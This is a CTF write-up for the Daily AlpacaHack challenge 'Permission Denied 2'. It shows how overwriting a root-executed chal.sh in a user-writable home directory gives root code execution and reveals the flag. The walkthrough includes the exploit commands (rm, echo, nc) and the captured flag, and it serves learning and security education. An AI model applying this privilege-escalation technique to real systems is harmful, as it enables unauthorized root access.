---
title: "Daily AlpacaHack: Permission Denied 2 Writeup"
description: "At this point I don't know what to put here part 2"
pubDate: 2026-04-30
tags: ["alpacahack", "misc", "unix permissions"]
---

Once again in this Daily AlpacaHack challenge, we are once again the same goal as yesterday's challenge: read `flag.txt` from a Debian Trixie shell. The flag file is created by root in the `alpaca` user directory, but this time instead of using `echo Alpaca{REDACTED} > flag.txt` and `chmod 400 flag.txt` the flag is created using `install -m 400 /dev/stdin flag.txt` and the permissions are set to `0400` from the moment of creation, so we cannot exploit the same race condition as before.

# The challenge

Just as yesterday we are given both the connection to the shell (via netcat) and the source code to instantiate the challenge: `Dockerfile`, `docker-compose.yml` (not relevant here), and `chal.sh` (which is the entrypoint of the container). Let's take a look at `chal.sh` and `Dockerfile`:

```dockerfile
FROM python:3.14.4-slim-trixie
RUN apt-get update && apt-get install -yq socat
RUN useradd -m alpaca
WORKDIR /home/alpaca
COPY --chmod=400 chal.sh ./
CMD ["socat", "tcp-listen:1337,fork,reuseaddr", "exec:'bash chal.sh',stderr,pty,ctty,setsid,echo=0"]

```

```bash
echo Alpaca{REDACTED} |
install -m 400 /dev/stdin flag.txt
runuser -u alpaca -- sh
rm flag.txt

```

The main and important difference with the previous challenge and what allow us at all to recover the flag is that the `chal.sh` is saved on the home directory of the `alpaca` user (the one we own), so even if we can't read the flag or `chal.sh` we can still remove it because we have write permissions on the home directory. This means that we can overwrite `chal.sh` with a custom script that will allow us to read the flag as this is executed as root in the Dockerfile `CMD` instruction.

# The exploit

As said before, the main idea of the exploit is to overwrite `chal.sh` with a custom script that will allow us to read the flag (it can simply be `cat flag.txt`), and then trigger the execution of that script by connecting to the shell from another terminal.

This is the exploit path:

1. First we open a shell connection to the challenge and remove the `chal.sh` file using `rm -rf chal.sh`. This will allow us to create a new `chal.sh` file with our custom script.

```bash
rm -rf chal.sh
```

2. Now we can create a new `chal.sh` file with our custom script.

```bash
echo "cat flag.txt" > chal.sh
```

3. Finally, we can trigger the execution of our custom `chal.sh` script by connecting to the shell from another terminal. This will execute our script as root and allow us to read the flag.

```bash
$ nc 34.170.146.252 63303
Alpaca{h4s_c0mpl3t3_p3rm1ss10ns_0v3r_3v3ry7h1ng}
```

# Conclusion

In comparison to the other, where the issue was the way the flag files was being created and granted permissions (allowing a race condition), in this one the issue is that the chal.sh script is being executed as root, but the file was stored in a location where we have write permissions, allowing us to overwrite it and execute our own script as root, allowing an arbitrary code execution as root allowing us to recover the flag.

# Greetings

As always, thanks to the Daily AlpacaHack team for hosting these daily challenges, and once again this time to minaminao as the admin of Daily AlpacaHack and author of this challenge. Both challenges (this one and the previous one) were really fun and interesting to solve, as both shows how a tiny difference in the way the flag file is created and stored can lead to completely different attack paths.